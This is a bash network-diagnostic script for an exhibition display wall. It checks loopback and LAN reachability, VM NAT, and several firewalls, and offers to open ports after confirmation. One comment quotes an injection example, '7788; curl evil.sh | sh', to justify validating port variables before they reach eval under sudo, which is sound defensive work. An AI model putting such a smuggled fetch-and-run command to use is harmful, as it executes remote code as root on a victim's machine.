#!/usr/bin/env bash
# ===========================================================================
#  GISEC 2026 — "why can't another device reach this?"
# ---------------------------------------------------------------------------
#  Answers one question: can a phone, an iPad or the big screen open the wall
#  that is running on this machine — and if not, which of the usual four
#  reasons is it?
#
#      1. the services are not running, or are bound to loopback only
#      2. this machine is inside a VM using NAT, so it has no LAN address
#      3. a firewall is dropping the ports
#      4. the two devices are simply not on the same network
#
#  The FETCH TEST is the ground truth: if an HTTP request to a LAN address
#  succeeds, the service is up and listening there, whatever the other checks
#  can or cannot see. Everything else exists only to explain a failure.
#
#  Run it while ./run-local.sh is up.
#
#      ./network-check.sh          diagnose only, changes nothing
#      ./network-check.sh --fix    also offer to open the ports (asks first)
#
#  DMATICS IT Solutions LLC · Dubai
# ===========================================================================
set -uo pipefail

HUB_PORT="${HUB_PORT:-7788}"
RT_PORT="${RT_PORT:-8000}"

# These two are interpolated into firewall commands that are later handed to
# `eval` under sudo. HUB_PORT='7788; curl evil.sh | sh' would have been run as
# root by anyone who pasted a "helpful" one-liner off the internet. A port is a
# number; refuse anything that is not one, before it reaches a command string.
for _name in HUB_PORT RT_PORT; do
  eval "_value=\$$_name"
  case "$_value" in
    ''|*[!0-9]*) echo "$_name must be a number (got '$_value')" >&2; exit 1 ;;
  esac
  if [ "$_value" -lt 1 ] || [ "$_value" -gt 65535 ]; then
    echo "$_name must be between 1 and 65535 (got '$_value')" >&2; exit 1
  fi
done
unset _name _value

# --fix opens the ports on whichever firewall is actually running. It always
# prints the exact commands and asks before touching anything — a script that
# silently rewrites firewall rules is not something to run on a laptop you
# also use for work.
APPLY_FIX=0
case "${1:-}" in
  --fix) APPLY_FIX=1 ;;
  -h|--help) sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
  "") ;;
  *) echo "unknown option: $1  (use --fix to open the ports)"; exit 1 ;;
esac

if [ -t 1 ]; then
  B=$'\033[1m'; D=$'\033[2m'; R=$'\033[0m'
  OK=$'\033[32m'; WARN=$'\033[33m'; ERR=$'\033[31m'; CY=$'\033[36m'
else B=""; D=""; R=""; OK=""; WARN=""; ERR=""; CY=""; fi
good(){ printf '  %s✓%s %s\n' "$OK" "$R" "$*"; }
warn(){ printf '  %s!%s %s\n' "$WARN" "$R" "$*"; }
bad(){  printf '  %s✗%s %s\n' "$ERR" "$R" "$*"; }
head2(){ printf '\n%s%s%s\n' "$B" "$*" "$R"; }

# Every usable IPv4 address on this machine, as "interface address" lines.
#
# Three sources, because a stripped-down box may have none of the usual tools:
# iproute2 first (it knows interface names and scope), then ifconfig, then
# `hostname -I`, which knows only addresses. Docker, libvirt, VPN and
# link-local ranges are dropped — they resolve here and nowhere else, and
# handing one to an iPad looks exactly like "the IP does not work".
lan_candidates() {
  local out=""
  if command -v ip >/dev/null 2>&1; then
    out="$(ip -o -4 addr show scope global 2>/dev/null \
      | awk '{print $2" "$4}' | sed 's#/[0-9]*##' \
      | grep -vE '^(lo|docker|br-|virbr|veth|tun|tap|zt|wg)')"
  fi
  if [ -z "$out" ] && command -v ifconfig >/dev/null 2>&1; then
    out="$(ifconfig 2>/dev/null | awk '/^[a-z]/{i=$1; sub(":","",i)} /inet /{print i" "$2}' \
      | grep -vE '^(lo|docker|br-|virbr|veth|tun|tap)')"
  fi
  if [ -z "$out" ]; then
    out="$(hostname -I 2>/dev/null | tr ' ' '\n' | grep -E '^[0-9]+\.' \
      | grep -vE '^(127\.|169\.254\.|172\.1[7-9]\.|172\.2[0-9]\.|172\.3[0-1]\.)' \
      | awk 'NF{print "net "$1}')"
  fi
  printf '%s\n' "$out" | awk 'NF'
}

# Every reachability check in this script is a curl call. Without curl they all
# return an empty string, which reads as "nothing is running" — and the script
# then tells the operator to start a hub that is already up.
if ! command -v curl >/dev/null 2>&1; then
  printf '\n  curl is not installed, and every check here needs it.\n'
  printf '  Install it:  sudo apt install -y curl\n\n'
  exit 1
fi
fetch(){ curl -s -o /dev/null -m 3 -w '%{http_code}' "$1" 2>/dev/null; }

# A QR code beats typing an address into an iPad, and at a stand it is how you
# hand the wall to someone in two seconds. qrencode is a one-line install and
# the URL is printed either way, so its absence costs nothing.
show_qr() {
  local url="$1"
  if command -v qrencode >/dev/null 2>&1; then
    printf '\n'
    qrencode -t ANSIUTF8 -m 2 "$url" 2>/dev/null | sed 's/^/  /'
    printf '  %sScan this with the phone or iPad%s\n' "$D" "$R"
  else
    printf '\n  %sTip: sudo apt install -y qrencode  — then this prints a QR code\n  you can scan instead of typing the address.%s\n' "$D" "$R"
  fi
}


printf '\n%s╔══════════════════════════════════════════════════════╗%s\n' "$CY" "$R"
printf '%s║   NETWORK CHECK — can other devices reach this?      ║%s\n' "$CY" "$R"
printf '%s╚══════════════════════════════════════════════════════╝%s\n' "$CY" "$R"

LOCAL_HEALTH="http://127.0.0.1:$HUB_PORT/api/health"
CANDIDATES="$(lan_candidates)"
REACHABLE=""

# --- the ground truth ------------------------------------------------------
head2 "Reachability"
# /api/health is the hub itself. "/" is the wall's index.html, which is only
# there once the wall has been built — probing it made an unbuilt (but perfectly
# healthy) hub look dead, and sent the operator off to restart a running service.
LOOPBACK="$(fetch "$LOCAL_HEALTH")"
if [ "$LOOPBACK" = "200" ]; then
  good "the hub answers on this machine (127.0.0.1:$HUB_PORT)"
  if [ "$(fetch "http://127.0.0.1:$HUB_PORT/")" != "200" ]; then
    warn "the hub is up but the wall is not built — run:  ./run-local.sh --build"
  fi
else
  bad "the hub does not answer even locally — it is not running"
  printf '\n%sStart it first:%s  ./run-local.sh\n\n' "$B" "$R"
  exit 1
fi

if [ -z "$CANDIDATES" ]; then
  bad "this machine has no LAN address at all"
else
  while read -r iface addr; do
    [ -z "$addr" ] && continue
    c="$(fetch "http://$addr:$HUB_PORT/api/health")"
    if [ "$c" = "200" ]; then
      good "answers on $addr  ${D}($iface)${R}"
      REACHABLE="$REACHABLE$addr "
    else
      bad "no answer on $addr  ${D}($iface — status ${c:-none})${R}"
    fi
  done <<EOF
$CANDIDATES
EOF
fi

# --- why it might still fail from another device ---------------------------
head2 "Things that block another device"

VIRT="$(systemd-detect-virt 2>/dev/null | head -1)"
[ -z "$VIRT" ] && VIRT="none"
NAT_SUSPECT=0
printf '%s\n' "$CANDIDATES" | grep -qE ' (10\.0\.2\.[0-9]+|192\.168\.56\.[0-9]+|192\.168\.122\.[0-9]+)$' && NAT_SUSPECT=1

VM_PROBLEM=0
if [ "$NAT_SUSPECT" = 1 ]; then
  bad "the address is in a VM NAT / host-only range"
  VM_PROBLEM=1
elif [ "$VIRT" != "none" ] && [ -n "$VIRT" ] && [ "$VIRT" != "docker" ] && [ "$VIRT" != "podman" ]; then
  warn "running inside a virtual machine ($VIRT) — make sure its adapter is Bridged"
else
  good "not behind VM NAT"
fi

FW_PROBLEM=0
FW_NAME=""
FIX_CMDS=""

add_fix(){ FIX_CMDS="${FIX_CMDS}$1"$'\n'; }

# Kali can be running any of four firewalls, and which one is in charge is not
# obvious — ufw is a front end for iptables, iptables may be a front end for
# nftables, and firewalld may own all of it. Check each in the order that one
# would override the others.
if command -v firewall-cmd >/dev/null 2>&1 && firewall-cmd --state >/dev/null 2>&1; then
  FW_NAME="firewalld"
  if firewall-cmd --list-ports 2>/dev/null | grep -q "$HUB_PORT/tcp"; then
    good "firewalld is running and port $HUB_PORT is open"
  else
    bad "firewalld is running and port $HUB_PORT is NOT open"
    FW_PROBLEM=1
    add_fix "sudo firewall-cmd --permanent --add-port=$HUB_PORT/tcp"
    add_fix "sudo firewall-cmd --permanent --add-port=$RT_PORT/tcp"
    add_fix "sudo firewall-cmd --reload"
  fi
elif command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | head -1 | grep -q active; then
  FW_NAME="ufw"
  if ufw status 2>/dev/null | grep -qE "(^|[^0-9])$HUB_PORT([^0-9]|$)"; then
    good "ufw is active and port $HUB_PORT is allowed"
  else
    bad "ufw is active and port $HUB_PORT is NOT allowed"
    FW_PROBLEM=1
    add_fix "sudo ufw allow $HUB_PORT/tcp"
    add_fix "sudo ufw allow $RT_PORT/tcp"
  fi
elif command -v nft >/dev/null 2>&1 && [ -n "$(nft list ruleset 2>/dev/null)" ]; then
  FW_NAME="nftables"
  if nft list ruleset 2>/dev/null | grep -qE "policy drop|policy reject"; then
    if nft list ruleset 2>/dev/null | grep -q "$HUB_PORT"; then
      good "nftables is filtering but port $HUB_PORT appears in the ruleset"
    else
      bad "nftables has a drop policy and no rule for port $HUB_PORT"
      FW_PROBLEM=1
      add_fix "sudo nft add rule inet filter input tcp dport $HUB_PORT accept"
      add_fix "sudo nft add rule inet filter input tcp dport $RT_PORT accept"
      add_fix "# to survive a reboot:  sudo nft list ruleset | sudo tee /etc/nftables.conf"
    fi
  else
    good "nftables loaded but not dropping input"
  fi
elif command -v iptables >/dev/null 2>&1 && iptables -S INPUT 2>/dev/null | grep -qE '^-P INPUT (DROP|REJECT)'; then
  FW_NAME="iptables"
  if iptables -S INPUT 2>/dev/null | grep -q -- "--dport $HUB_PORT"; then
    good "iptables default policy is DROP but port $HUB_PORT is accepted"
  else
    bad "iptables default INPUT policy is DROP and port $HUB_PORT is not accepted"
    FW_PROBLEM=1
    add_fix "sudo iptables -I INPUT -p tcp --dport $HUB_PORT -j ACCEPT"
    add_fix "sudo iptables -I INPUT -p tcp --dport $RT_PORT -j ACCEPT"
    add_fix "# to survive a reboot:  sudo apt install iptables-persistent && sudo netfilter-persistent save"
  fi
else
  good "no active firewall found (ufw / firewalld / nftables / iptables)"
fi

# Reading most firewall state needs root. Without it a real block can look
# like "nothing found", so say so rather than implying all is well.
if [ "$(id -u)" != "0" ] && [ -z "$FW_NAME" ]; then
  warn "not running as root — a firewall could be active without being visible here"
  warn "if devices still cannot connect, re-run: ${CY}sudo ./network-check.sh${R}"
fi

# --- verdict ---------------------------------------------------------------
head2 "What to do"
FIRST="$(printf '%s' "$REACHABLE" | awk '{print $1}')"

if [ "$VM_PROBLEM" = 1 ]; then
  cat <<EOF
  ${ERR}This is the problem.${R}

  Kali is in a virtual machine using NAT or host-only networking. Its address
  exists only inside your laptop, so no phone, iPad or second laptop on the
  Wi-Fi can ever reach it — no amount of firewall opening will change that.

  ${B}Fix:${R} shut the VM down, switch the network adapter to ${B}Bridged${R}, boot it again.

    VirtualBox   Settings > Network > Attached to: ${CY}Bridged Adapter${R}
    VMware       VM Settings > Network Adapter > ${CY}Bridged${R}  (replicate physical state)
    UTM / QEMU   Network > Network Mode: ${CY}Bridged${R}
    Hyper-V      Virtual Switch Manager > create an ${CY}External${R} switch

  The VM then picks up an address on the same 192.168.x network as your phone.
  Run ./run-local.sh again afterwards — it will detect the new address.

  ${D}Quick alternative if you cannot change the adapter: forward the ports on the
  host. VirtualBox > Settings > Network > Advanced > Port Forwarding, host port
  $HUB_PORT to guest $HUB_PORT and $RT_PORT to $RT_PORT, then use the HOST laptop's
  Wi-Fi address on the other devices.${R}
EOF
elif [ "$FW_PROBLEM" = 1 ]; then
  printf '  %sThe %s firewall is blocking the ports.%s\n\n' "$ERR" "$FW_NAME" "$R"
  printf '%s\n' "$FIX_CMDS" | sed 's/^/    /'
  if [ "$APPLY_FIX" = 1 ]; then
    printf '\n  %sRun these now?%s [y/N] ' "$B" "$R"
    read -r reply
    case "$reply" in
      y|Y|yes|YES)
        printf '\n'
        printf '%s\n' "$FIX_CMDS" | grep -v '^#' | while read -r cmd; do
          [ -z "$cmd" ] && continue
          printf '  %s+ %s%s\n' "$D" "$cmd" "$R"
          eval "$cmd" || bad "failed: $cmd"
        done
        printf '\n  %sDone. Try the URL from the other device again.%s\n' "$OK" "$R" ;;
      *) printf '\n  Nothing changed.\n' ;;
    esac
  else
    printf '\n  %sRun them for me:%s  ./network-check.sh --fix\n' "$B" "$R"
  fi
  printf '\n  Then open %shttp://%s:%s/%s on the other device.\n' "$CY" "${FIRST:-<ip>}" "$HUB_PORT" "$R"
elif [ -n "$FIRST" ]; then
  cat <<EOF
  ${OK}Nothing is wrong on this machine.${R} The wall is up and answering on its LAN
  address, so anything on the same network should reach it.

  On the other device open:  ${CY}http://$FIRST:$HUB_PORT/${R}

  ${B}If it still fails, work through these in order on the OTHER device:${R}

  ${B}1.${R} Open the plain health check first, not the wall:
       ${CY}http://$FIRST:$HUB_PORT/api/health${R}
     It is one line of text with no images or scripts. If THAT loads, the
     network is fine and the problem is the browser or the page.

  ${B}2.${R} Type the address in full, starting with ${CY}http://${R}
     Without it, phones treat "$FIRST:$HUB_PORT" as a search term, and some
     browsers silently try https:// — which this does not serve.

  ${B}3.${R} Check the other device is on the same network. Its own IP should start
     ${CY}192.168.1.${R} — on iOS: Settings > Wi-Fi > (i) next to the network.
     A phone on mobile data, or on a "guest" SSID, is on a different network.

  ${B}4.${R} If its IP is 192.168.1.x and step 1 still fails, the router is doing
     ${B}client isolation${R} — devices get internet but cannot see each other.
     Nothing on this laptop can change that. Look for "AP isolation",
     "client isolation" or "guest mode" in the router settings, or use your
     own network instead.

  ${D}At the stand, do not rely on the venue Wi-Fi: bring a cheap travel router,
  or use a phone hotspot with the laptop, the iPad and the screen all joined to
  it. None of this needs internet — only that the devices can see each other.${R}
EOF
  show_qr "http://$FIRST:$HUB_PORT/"
else
  cat <<EOF
  ${ERR}The wall runs locally but answers on no LAN address.${R}

  Either this machine is not on a network, or every address it has is a
  virtual one. Connect it to the booth Wi-Fi or a cable and run this again.
EOF
fi
printf '\n'
